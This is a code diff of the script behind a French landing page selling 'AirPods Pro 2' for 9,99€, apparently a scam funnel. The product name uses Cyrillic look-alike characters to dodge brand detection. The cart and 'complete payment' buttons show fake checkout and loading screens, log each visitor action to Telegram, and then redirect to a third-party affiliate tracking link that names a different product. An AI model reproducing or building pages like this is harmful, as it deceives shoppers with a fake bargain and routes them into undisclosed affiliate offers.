                 setTimeout(() => {
-                    if (!floatingOrderBtn.classList.contains('visible')) floatingOrderBtn.style.display = 'none';
-                }, 400);
+                    if (!floatingOrderBtn.classList.contains('visible')) {
+                        floatingOrderBtn.style.display = 'none';
+                    }
+                }, 400); 
             }
         }
     }
     window.addEventListener('scroll', handleScroll);
-    if (orderBtn) handleScroll();
-
-    // --- Main Order Modal & Cart Logic ---
-    const colorImageSources = {
-        blanc: "https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg",
-        noir: "https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg"
-    };
-
-    function openOrderModal() {
-        mainOrderButtonClicked = true; 
-        if (timedPopupTimeoutId) {
-            clearTimeout(timedPopupTimeoutId);
-            timedPopupTimeoutId = null;
-        }
-        if (mainModal && cartBar && cartBarАiгРоdsImg && popupАiгРоdsImg) {
-            mainModal.style.display = "flex";
-            cartBar.classList.add("show-cart-bar");
-            const selectedColor = document.querySelector('input[name="color"]:checked').value;
-            cartBarАiгРоdsImg.src = colorImageSources[selectedColor];
-            popupАiгРоdsImg.src = colorImageSources[selectedColor];
-            sendTelegramAlert('Order Modal Opened / Add to Cart', { product: 'AirPods Рго 2', price: '9,99€', initialColor: selectedColor });
-            
-            // Facebook Pixel AddToCart Event
-            if (typeof fbq === 'function') {
-                fbq('track', 'AddToCart', {
-                    ...fbProductDetails,
-                    content_name: `AirPods Рго 2 - Offre Exclusive Anniversaire - Couleur ${selectedColor}` // Example of adding variant
-                });
-            }
-        }
+    if (orderBtn) { 
+        handleScroll();
     }
 
-    if (orderBtn) orderBtn.onclick = openOrderModal;
-    if (floatingOrderBtn) floatingOrderBtn.onclick = openOrderModal;
-    if (closeModalBtn && mainModal) closeModalBtn.onclick = function() { mainModal.style.display = "none"; };
-    if (mainModal) mainModal.addEventListener('click', function(event) {
-        if (event.target === mainModal) mainModal.style.display = 'none';
-    });
 
-    if (finalizeBtn && mainModal && loadingPopup) {
-        finalizeBtn.onclick = function() {
-            const selectedColor = document.querySelector('input[name="color"]:checked').value;
-            mainModal.style.display = "none";
-            loadingPopup.style.display = "flex";
-            sendTelegramAlert('Finaliser la commande (AirPods Рго 2)', { selectedColor: selectedColor, quantity: 1 });
+    // --- Order Flow Logic ---
 
-            // Facebook Pixel InitiateCheckout Event
-            if (typeof fbq === 'function') {
-                fbq('track', 'InitiateCheckout', {
-                     ...fbProductDetails,
-                     num_items: 1 // Assuming quantity is always 1 as per a previous observation
-                });
+    // 1. Open "Add to Cart" Modal
+    function openAddToCartModal() {
+        if (addToCartModal) {
+            addToCartModal.style.display = "flex";
+            sendTelegramAlert('Fenêtre "Ajouter au panier" ouverte');
+        }
+    }
+    
+    if(orderBtn) orderBtn.onclick = openAddToCartModal;
+    if(floatingOrderBtn) floatingOrderBtn.onclick = openAddToCartModal;
+
+    // 2. Click "Ajouter au Panier" -> Show Confirmation Modal & Timed Cart Bar
+    if (confirmAddToCartBtn) {
+        confirmAddToCartBtn.onclick = function() {
+            if (addToCartModal) addToCartModal.style.display = "none";
+            if (confirmationModal) confirmationModal.style.display = "flex";
+            
+            // Show the "added to cart" bar and hide it after 2 seconds
+            if (cartBar) {
+                cartBar.classList.add("show-cart-bar");
+                setTimeout(() => {
+                    cartBar.classList.remove("show-cart-bar");
+                }, 2000);
             }
 
-            setTimeout(() => {
-                window.location.href = "https://ttgn.tracktimegenius.com/aff_c?offer_id=85898&aff_id=1931&source=AirPods+Pro+2___https://inidkan.com/3234-large_default/airpods-pro-2-vrac.jpg";
-            }, 3000);
+            sendTelegramAlert('Clic sur "Ajouter au panier"', { product: 'АігРоds Pro 2', price: '9,99€', color: 'Blanc' });
         };
     }
-
-    if (colorRadios.length && popupАiгРоdsImg && cartBarАiгРоdsImg) {
-        colorRadios.forEach(radio => {
-            radio.addEventListener('change', function() {
-                if (this.checked) {
-                    const selectedColorValue = this.value;
-                    if (popupАiгРоdsImg) popupАiгРоdsImg.src = colorImageSources[selectedColorValue];
-                    if (cartBarАiгРоdsImg) cartBarАiгРоdsImg.src = colorImageSources[selectedColorValue];
-                    sendTelegramAlert('Color Changed (AirPods Рго 2)', { newColor: selectedColorValue });
+    
+    // 3. Click "Compléter le paiement" -> Show Loading & Redirect
+    if (confirmPaymentBtn) {
+        confirmPaymentBtn.onclick = function() {
+            if(confirmationModal) confirmationModal.style.display = "none";
+            if(loadingPopup) loadingPopup.style.display = "flex";
+            sendTelegramAlert('Clic sur "Compléter le paiement"');
+            
+            setTimeout(() => {
+                sendTelegramAlert('Redirection vers Google initiée');
+                window.location.href = "https://ttgn.tracktimegenius.com/aff_c?offer_id=85898&aff_id=1931&source=JBL+Tune+130NC___https://cdn.shopify.com/s/files/1/0552/0883/7292/files/JBL-Tune-130NC_9b223374-7d4e-42bd-8bf8-19d504e16924.jpg";
+            }, 2000); // 2-second delay
+        };
+    }
+    
+    // --- Close Modal Buttons & Background Click ---
+    function setupModalClose(modal, closeBtn) {
+        if (modal && closeBtn) {
+            closeBtn.onclick = () => { modal.style.display = 'none'; };
+        }
+        if (modal) {
+             modal.addEventListener('click', function(event) {
+                if (event.target === modal) { 
+                    modal.style.display = 'none';
                 }
             });
-        });
+        }
     }
+    setupModalClose(addToCartModal, closeCartModal);
+    setupModalClose(confirmationModal, closeConfirmationModal);
+
 
     // --- Other UI Interactions ---
     if (detailsBtn && featuresSection) {
         detailsBtn.onclick = function() {
             const headerOffset = mainHeader ? mainHeader.offsetHeight : 0;
             const elementPosition = featuresSection.getBoundingClientRect().top + window.scrollY;
-            const offsetPosition = elementPosition - headerOffset - 20;
+            const offsetPosition = elementPosition - headerOffset - 20; 
             window.scrollTo({ top: offsetPosition, behavior: 'smooth' });
-            sendTelegramAlert('Product Details Viewed (AirPods Рго 2)');
+            sendTelegramAlert('Clic sur "Voir détails du produit"');
         }
     }
 
-    if (currentYearSpan) currentYearSpan.textContent = new Date().getFullYear();
+    if (currentYearSpan) {
+        currentYearSpan.textContent = new Date().getFullYear();
+    }
 
-    function setupModalLink(linkEl, pageEl, modalName) {
+    function setupPolicyModalLink(linkEl, pageEl, modalName) {
         if (linkEl && pageEl) {
-            linkEl.onclick = (e) => {
-                e.preventDefault();
-                pageEl.style.display = 'flex';
+            linkEl.onclick = (e) => { 
+                e.preventDefault(); 
+                pageEl.style.display = 'flex'; 
                 sendTelegramAlert('Policy Modal Opened', { modal: modalName });
             };
             const policyCloseBtn = pageEl.querySelector('.policy-content .close-btn');
-            if (policyCloseBtn) policyCloseBtn.onclick = () => { pageEl.style.display = 'none'; };
+            if (policyCloseBtn) {
+                policyCloseBtn.onclick = () => { pageEl.style.display = 'none'; };
+            }
+             pageEl.addEventListener('click', function(event) {
+                if (event.target === pageEl) {
+                    this.style.display = 'none';
+                }
+            });
         }
     }
-    setupModalLink(aboutLink, aboutPage, 'À Propos');
-    setupModalLink(privacyLink, privacyPage, 'Confidentialité');
-    setupModalLink(termsLink, termsPage, 'Conditions');
-    setupModalLink(supportLink, supportPage, 'Support');
-    setupModalLink(contactLink, contactPage, 'Contact');
 
-    document.querySelectorAll('.policy-modal').forEach(modal => {
-        modal.addEventListener('click', function(event) {
-            if (event.target === this) this.style.display = 'none';
-        });
-    });
+    setupPolicyModalLink(aboutLink, aboutPage, 'À Propos');
+    setupPolicyModalLink(privacyLink, privacyPage, 'Confidentialité');
+    setupPolicyModalLink(termsLink, termsPage, 'Conditions');
+    setupPolicyModalLink(supportLink, supportPage, 'Support');
+    setupPolicyModalLink(contactLink, contactPage, 'Contact');
 
     featureImages.forEach(img => {
         img.onerror = function() {
@@ -841,17 +744,17 @@ Ne manquez pas cette opportunité exceptionnelle !
 
     // Initial Page Load Tracking
     window.addEventListener('load', () => {
-        sendTelegramAlert('Page Loaded (AirPods Рго 2 Offer)');
-        if (orderBtn) {
+        sendTelegramAlert('Page "Offre АігРоds Pro 2" chargée');
+        if (orderBtn) { 
             setTimeout(() => {
-                if(orderBtn) originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
-                handleScroll();
-            }, 200);
+                if(orderBtn) {
+                    originalOrderBtnOffsetTop = orderBtn.getBoundingClientRect().top + window.scrollY;
+                }
+                handleScroll(); 
+            }, 200); 
         }
-        // Note: ViewContent is already fired in the <head> with the base pixel code.
-        // If you need it to fire strictly after full load, you could move it here.
     });
     </script>
 
-    </body>
+</body>
 </html>
